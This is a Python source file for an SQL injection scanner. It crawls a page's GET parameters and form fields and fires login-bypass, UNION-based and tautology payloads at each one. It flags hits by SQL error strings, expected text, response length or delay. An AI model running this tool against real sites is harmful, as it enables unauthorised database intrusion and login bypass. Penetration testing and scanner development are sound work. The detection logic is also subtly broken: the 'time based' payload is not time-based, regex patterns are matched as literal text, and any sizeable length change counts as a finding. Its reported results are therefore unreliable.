import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse
import time
import json
from typing import List, Dict, Union

class SQLiScanner:
    def __init__(self, session):
        self.session = session
        self.vulnerable_points = []
        self.payloads = self._load_payloads()
        self.baseline_responses = {}
        
    def _load_payloads(self) -> List[Dict]:
        """Load SQL injection payloads from file"""
        try:
            with open("crawler/payloads/sqli_payloads.json", "r") as f:
                return json.load(f)
        except FileNotFoundError:
            # Default payloads if file not found
            return [
                {
                    "name": "Login Bypass",
                    "payload": "' OR '1'='1",
                    "expected_result": "Welcome"
                },
                {
                    "name": "Union Based",
                    "payload": "' UNION SELECT 1,2,3--",
                    "expected_result": "2"
                },
                {
                    "name": "Error Based",
                    "payload": "' OR 1=1--",
                    "expected_result": "Welcome"
                },
                {
                    "name": "Boolean Based",
                    "payload": "' OR 1=1#",
                    "expected_result": "Welcome"
                },
                {
                    "name": "Time Based",
                    "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
                    "expected_result": "Welcome"
                }
            ]

    def _get_baseline_response(self, url: str, method: str = "GET", data: Dict = None) -> str:
        """Get baseline response for comparison"""
        try:
            if method == "GET":
                response = self.session.get(url)
            else:
                response = self.session.post(url, data=data)
            return response.text
        except Exception as e:
            print(f"Error getting baseline response: {str(e)}")
            return ""

    def test_get_parameter(self, url: str, param: str, value: str) -> Dict:
        """Test a GET parameter for SQL injection vulnerabilities"""
        results = {
            "url": url,
            "parameter": param,
            "method": "GET",
            "vulnerable": False,
            "payloads": []
        }

        # Get baseline response
        baseline = self._get_baseline_response(url)
        if not baseline:
            return results

        for payload in self.payloads:
            try:
                # Create a new URL with the payload
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[param] = [payload["payload"]]
                
                # Reconstruct URL with payload
                new_query = "&".join(f"{k}={v[0]}" for k, v in params.items())
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                # Send request with payload
                response = self.session.get(test_url)
                response_text = response.text
                
                # Check for vulnerabilities using multiple methods
                is_vulnerable = False
                detection_method = ""

                # 1. Check for SQL errors
                if self._check_sql_error(response_text):
                    is_vulnerable = True
                    detection_method = "Error based"

                # 2. Check for expected results
                elif payload.get("expected_result") and payload["expected_result"] in response_text:
                    is_vulnerable = True
                    detection_method = "Result based"

                # 3. Check for response length difference
                elif abs(len(response_text) - len(baseline)) > 100:
                    is_vulnerable = True
                    detection_method = "Length based"

                # 4. Check for response time
                elif response.elapsed.total_seconds() > 2:
                    is_vulnerable = True
                    detection_method = "Time based"

                if is_vulnerable:
                    results["vulnerable"] = True
                    results["payloads"].append({
                        "name": payload["name"],
                        "payload": payload["payload"],
                        "detection_method": detection_method,
                        "response_length": len(response_text)
                    })
                
                # Add delay to avoid overwhelming the server
                time.sleep(0.5)
                
            except Exception as e:
                print(f"Error testing GET parameter {param}: {str(e)}")
                continue
                
        return results

    def test_post_parameter(self, url: str, form_data: Dict, param: str) -> Dict:
        """Test a POST parameter for SQL injection vulnerabilities"""
        results = {
            "url": url,
            "parameter": param,
            "method": "POST",
            "vulnerable": False,
            "payloads": []
        }

        # Get baseline response
        baseline = self._get_baseline_response(url, "POST", form_data)
        if not baseline:
            return results

        for payload in self.payloads:
            try:
                # Create a copy of form data and inject payload
                test_data = form_data.copy()
                test_data[param] = payload["payload"]
                
                # Send POST request with payload
                response = self.session.post(url, data=test_data)
                response_text = response.text
                
                # Check for vulnerabilities using multiple methods
                is_vulnerable = False
                detection_method = ""

                # 1. Check for SQL errors
                if self._check_sql_error(response_text):
                    is_vulnerable = True
                    detection_method = "Error based"

                # 2. Check for expected results
                elif payload.get("expected_result") and payload["expected_result"] in response_text:
                    is_vulnerable = True
                    detection_method = "Result based"

                # 3. Check for response length difference
                elif abs(len(response_text) - len(baseline)) > 100:
                    is_vulnerable = True
                    detection_method = "Length based"

                # 4. Check for response time
                elif response.elapsed.total_seconds() > 2:
                    is_vulnerable = True
                    detection_method = "Time based"

                if is_vulnerable:
                    results["vulnerable"] = True
                    results["payloads"].append({
                        "name": payload["name"],
                        "payload": payload["payload"],
                        "detection_method": detection_method,
                        "response_length": len(response_text)
                    })
                
                # Add delay to avoid overwhelming the server
                time.sleep(0.5)
                
            except Exception as e:
                print(f"Error testing POST parameter {param}: {str(e)}")
                continue
                
        return results

    def _check_sql_error(self, response_text: str) -> bool:
        """Check response for SQL error patterns"""
        error_patterns = [
            "SQL syntax",
            "mysql_fetch_array",
            "mysql_fetch",
            "mysql_num_rows",
            "mysql_result",
            "mysql_query",
            "mysql error",
            "ORA-",
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            "Warning: mysql_",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Npgsql.",
            "Microsoft SQL Server",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "com.microsoft.sqlserver.jdbc.SQLServerException",
            "SQLServerException",
            "Error Occurred While Processing Request",
            "Server Error in '/' Application",
            "Unclosed quotation mark after the character string",
            "Microsoft OLE DB Provider for SQL Server",
            "SQLServer JDBC Driver",
            "SQLServerException",
            "System.Data.SqlClient.SqlException",
            "Unclosed quotation mark after the character string"
        ]
        
        return any(pattern.lower() in response_text.lower() for pattern in error_patterns)

    def scan_url(self, url: str) -> List[Dict]:
        """Scan a URL for SQL injection vulnerabilities"""
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Test GET parameters
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            for param in params:
                result = self.test_get_parameter(url, param, params[param][0])
                if result["vulnerable"]:
                    self.vulnerable_points.append(result)
            
            # Test forms
            forms = soup.find_all('form')
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(url, form_action)
                
                # Get form fields
                form_data = {}
                for input_field in form.find_all(['input', 'textarea']):
                    if input_field.get('name'):
                        form_data[input_field['name']] = input_field.get('value', '')
                
                # Test each form field
                for field_name in form_data:
                    if form_method == 'post':
                        result = self.test_post_parameter(form_url, form_data, field_name)
                    else:
                        result = self.test_get_parameter(form_url, field_name, form_data[field_name])
                    
                    if result["vulnerable"]:
                        self.vulnerable_points.append(result)
            
            return self.vulnerable_points
            
        except Exception as e:
            print(f"Error scanning URL {url}: {str(e)}")
            return [] 